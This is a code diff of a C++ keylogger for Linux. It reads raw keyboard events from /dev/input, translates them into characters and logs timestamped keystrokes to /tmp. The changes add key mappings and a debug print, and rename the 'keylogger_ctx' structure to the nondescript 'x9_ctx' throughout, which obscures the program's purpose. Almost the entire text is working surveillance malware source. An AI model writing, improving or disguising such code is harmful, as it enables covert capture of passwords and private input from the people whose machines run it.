@@ -3,20 +3,20 @@
 #include <sys/select.h>
 #include <unistd.h>
 
-#include <csignal>
 #include <chrono>
+#include <csignal>
 #include <cstring>
 #include <ctime>
 #include <fstream>
 #include <iostream>
 #include <map>
+#include <regex>
 #include <string>
 #include <vector>
-#include <regex>
 
 #define LOGS_DIRECTORY "/tmp/"
 
-struct keylogger_ctx {
+struct x9_ctx {
   bool is_capslock_on;
   bool is_shift_pressed;
   std::vector<int> kb_fds;
@@ -28,20 +28,21 @@ struct keylogger_ctx {
 struct key_event_handler {
   char key_char;
   char key_char_shift;
-  void (*cb)(struct keylogger_ctx *);
+  void (*cb)(struct x9_ctx *);
 };
 
-void handle_key(struct keylogger_ctx *);
-void handle_enter(struct keylogger_ctx *);
-void handle_backspace(struct keylogger_ctx *);
-void handle_capslock(struct keylogger_ctx *);
-void handle_delete(struct keylogger_ctx *);
-void handle_arrow(struct keylogger_ctx *);
-void handle_shift(struct keylogger_ctx *);
+void handle_key(struct x9_ctx *);
+void handle_enter(struct x9_ctx *);
+void handle_backspace(struct x9_ctx *);
+void handle_capslock(struct x9_ctx *);
+void handle_delete(struct x9_ctx *);
+void handle_arrow(struct x9_ctx *);
+void handle_shift(struct x9_ctx *);
 
 volatile std::sig_atomic_t must_stop{0};
 
 /* key mapping */
+// TODO: add more keys (consider keyboard layout)
 static const std::map<int, struct key_event_handler> handlers{
     {KEY_0, {'0', ')', handle_key}},
     {KEY_1, {'1', '!', handle_key}},
@@ -91,13 +92,12 @@ static const std::map<int, struct key_event_handler> handlers{
     {KEY_DELETE, {'\0', '\0', handle_delete}},
     {KEY_RIGHT, {'\0', '\0', handle_arrow}},
     {KEY_LEFT, {'\0', '\0', handle_arrow}},
-    {KEY_LEFTSHIFT, {'\0', '\0', handle_shift}}};
+    {KEY_LEFTSHIFT, {'\0', '\0', handle_shift}},
+    {KEY_RO, {'/', '?', handle_key}}};
 
-void sig_handler(int sig_num) {
-  must_stop = 1;
-}
+void sig_handler(int sig_num) { must_stop = 1; }
 
-void cleanup_ctx(struct keylogger_ctx *ctx) {
+void cleanup_ctx(struct x9_ctx *ctx) {
   for (auto &fd : ctx->kb_fds) {
     close(fd);
   }
@@ -124,15 +124,14 @@ std::vector<int> get_keyboard_fds() {
 
   for (auto &event : get_event_files()) {
     int fd = open(std::string("/dev/input/" + event).c_str(), O_RDONLY);
- 
+
     fds.emplace_back(fd);
   }
 
   return fds;
 }
 
-
-void handle_key(struct keylogger_ctx *ctx) {
+void handle_key(struct x9_ctx *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -149,10 +148,10 @@ void handle_key(struct keylogger_ctx *ctx) {
                         key_char);
 }
 
-void handle_enter(struct keylogger_ctx *ctx) {
+void handle_enter(struct x9_ctx *ctx) {
   char date[11], timestamp[9];
 
-  if (!ctx->event.value) {
+  if (!ctx->event.value || ctx->kb_buffer.empty()) {
     return;
   }
 
@@ -176,7 +175,7 @@ void handle_enter(struct keylogger_ctx *ctx) {
   ctx->buffer_cursor = 0;
 }
 
-void handle_capslock(struct keylogger_ctx *ctx) {
+void handle_capslock(struct x9_ctx *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -184,11 +183,11 @@ void handle_capslock(struct keylogger_ctx *ctx) {
   ctx->is_capslock_on = !ctx->is_capslock_on;
 }
 
-void handle_shift(struct keylogger_ctx *ctx) {
+void handle_shift(struct x9_ctx *ctx) {
   ctx->is_shift_pressed = ctx->event.value;
 }
 
-void handle_delete(struct keylogger_ctx *ctx) {
+void handle_delete(struct x9_ctx *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -198,7 +197,7 @@ void handle_delete(struct keylogger_ctx *ctx) {
   }
 }
 
-void handle_backspace(struct keylogger_ctx *ctx) {
+void handle_backspace(struct x9_ctx *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -208,7 +207,7 @@ void handle_backspace(struct keylogger_ctx *ctx) {
   }
 }
 
-void handle_arrow(struct keylogger_ctx *ctx) {
+void handle_arrow(struct x9_ctx *ctx) {
   if (!ctx->event.value) {
     return;
   }
@@ -219,7 +218,7 @@ void handle_arrow(struct keylogger_ctx *ctx) {
                                                  : (ctx->buffer_cursor + 1);
 }
 
-int run(struct keylogger_ctx *ctx) {
+int run(struct x9_ctx *ctx) {
   struct input_event ev;
   fd_set rfds;
 
@@ -234,7 +233,8 @@ int run(struct keylogger_ctx *ctx) {
       FD_SET(fd, &rfds);
     }
 
-    int ret = select(*(ctx->kb_fds.end() - 1) + 1, &rfds, nullptr, nullptr, nullptr);
+    int ret =
+        select(*(ctx->kb_fds.end() - 1) + 1, &rfds, nullptr, nullptr, nullptr);
 
     if (ret == -1) {
       continue;
@@ -246,6 +246,7 @@ int run(struct keylogger_ctx *ctx) {
 
         if ((ev.type == EV_KEY) && (n_bytes > 0)) {
           try {
+            std::cout << ev.code << std::endl;
             auto ev_handler = handlers.at(ev.code);
 
             ctx->event = ev;
@@ -264,11 +265,11 @@ int run(struct keylogger_ctx *ctx) {
 void deamonize() {}
 
 int main() {
-  struct keylogger_ctx ctx = {.is_capslock_on = false,
-                              .kb_fds = get_keyboard_fds(),
-                              .buffer_cursor = 0};
-
   std::signal(SIGINT, sig_handler);
+
+  struct x9_ctx ctx = {.is_capslock_on = false,
+                       .kb_fds = get_keyboard_fds(),
+                       .buffer_cursor = 0};
 
   int ret = run(&ctx);
   cleanup_ctx(&ctx);
